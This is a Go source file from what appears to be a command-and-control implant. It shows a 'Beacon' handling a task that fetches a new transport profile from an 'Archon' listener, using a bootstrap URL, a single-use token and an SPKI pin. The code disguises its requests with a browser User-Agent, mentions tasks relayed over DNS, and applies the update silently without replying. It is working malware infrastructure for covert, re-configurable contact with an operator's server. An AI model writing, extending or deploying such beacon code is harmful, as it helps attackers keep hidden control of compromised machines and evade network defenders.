package main

import (
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// httpProfileTaskPrefix marks the short transport update: a bootstrap URL, a
// single-use token, and the SPKI pin of the listener serving the profile.
//
// The task is deliberately small because it may travel through DNS, where every
// 80 bytes costs a request. The profile itself arrives over HTTP on first use.
const httpProfileTaskPrefix = "http_profile:"

// parseHTTPProfileTask splits "<url>|<token>|<pin>". The pin may be empty for a
// plain-HTTP listener, and a malformed task returns ok=false rather than half a
// configuration.
func parseHTTPProfileTask(command string) (bootstrapURL, token, pin string, ok bool) {
	if !strings.HasPrefix(command, httpProfileTaskPrefix) {
		return "", "", "", false
	}
	parts := strings.SplitN(strings.TrimPrefix(command, httpProfileTaskPrefix), "|", 3)
	if len(parts) < 2 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[1]) == "" {
		return "", "", "", false
	}
	bootstrapURL = strings.TrimSpace(parts[0])
	token = strings.TrimSpace(parts[1])
	if len(parts) == 3 {
		pin = strings.TrimSpace(parts[2])
	}
	return bootstrapURL, token, pin, true
}

// fetchBootstrapProfile retrieves the profile a token refers to.
//
// The pin travels with the task, so an https hand-off is verified against the
// listener certificate Archon already trusts. Without it a network attacker could
// answer the request and hand the beacon a profile pointing at their own server —
// the token being single-use does not help, because they would be the one spending
// it.
func fetchBootstrapProfile(bootstrapURL, token, pin string) (string, error) {
	parsed, err := url.Parse(bootstrapURL)
	if err != nil {
		return "", fmt.Errorf("bootstrap url: %w", err)
	}

	client := &http.Client{Timeout: 15 * time.Second, CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }}
	if parsed.Scheme == "https" && pin != "" {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{
				// Verification happens below against the SPKI pin. The certificate
				// chain is self-signed in most deployments, so chain validation
				// would fail for the wrong reason (an untrusted CA, not a
				// substituted listener).
				InsecureSkipVerify: true,
				VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
					if len(rawCerts) == 0 {
						return fmt.Errorf("no certificate presented")
					}
					certificate, err := x509.ParseCertificate(rawCerts[0])
					if err != nil {
						return fmt.Errorf("parse listener certificate: %w", err)
					}
					sum := sha256.Sum256(certificate.RawSubjectPublicKeyInfo)
					actual := base64.StdEncoding.EncodeToString(sum[:])
					actual = strings.TrimRight(actual, "=")
					if actual != strings.TrimRight(pin, "=") {
						return fmt.Errorf("listener certificate SPKI %s does not match the pinned %s", actual, pin)
					}
					return nil
				},
			},
		}
	}

	request, err := http.NewRequest(http.MethodGet, parsed.String(), nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("User-Agent", "Mozilla/5.0")
	request.Header.Set("X-Bootstrap-Token", token)

	response, err := client.Do(request)
	if err != nil {
		return "", fmt.Errorf("bootstrap request failed")
	}
	defer func() { _ = response.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(response.Body, 4<<20))
	if err != nil {
		return "", fmt.Errorf("failed to read bootstrap response")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("bootstrap returned status %d", response.StatusCode)
	}
	return string(body), nil
}

// applyHTTPProfileTask fetches and applies a transport update delivered as a URL
// plus token, instead of the full profile inside the task.
//
// Like the other fire-and-forget updates it sends no result: a reply would travel
// on whichever transport this update just replaced.
func (b *Beacon) applyHTTPProfileTask(command string) {
	bootstrapURL, token, pin, ok := parseHTTPProfileTask(command)
	if !ok {
		return
	}

	payload, err := fetchBootstrapProfile(bootstrapURL, token, pin)
	if err != nil {
		// The token is spent on Archon's side as soon as it is consumed, so a
		// retry is pointless: the operator has to re-apply the listener.
		fmt.Fprintf(os.Stderr, "[Beacon] profile fetch failed: %v\n", err)
		return
	}
	if err := b.transport.ApplyUpdate(payload); err != nil {
		// Silent rejection was indistinguishable from a queued change that had
		// not arrived yet; make the reason visible.
		fmt.Fprintf(os.Stderr, "[Beacon] transport update rejected: %v\n", err)
	}
}
